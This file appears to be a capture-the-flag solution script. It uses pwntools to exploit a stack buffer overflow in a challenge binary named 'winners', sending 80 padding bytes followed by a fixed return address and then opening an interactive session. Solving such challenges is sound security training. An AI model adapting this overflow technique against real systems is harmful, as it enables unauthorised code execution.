from pwn import *

#context(log_level = "debug")

p=process('./winners')
#p=remote('chals20.cybercastors.com', 14434)
magic_addr = 0x080491CF 

#gdb.attach(p, "b *0x4007c4")
#raw_input()
payload ='a'*80
payload += p32(magic_addr)

p.recvuntil('I\'ll give you one shot at it, what floor is the table at:\n')
p.sendline(payload)

p.interactive()

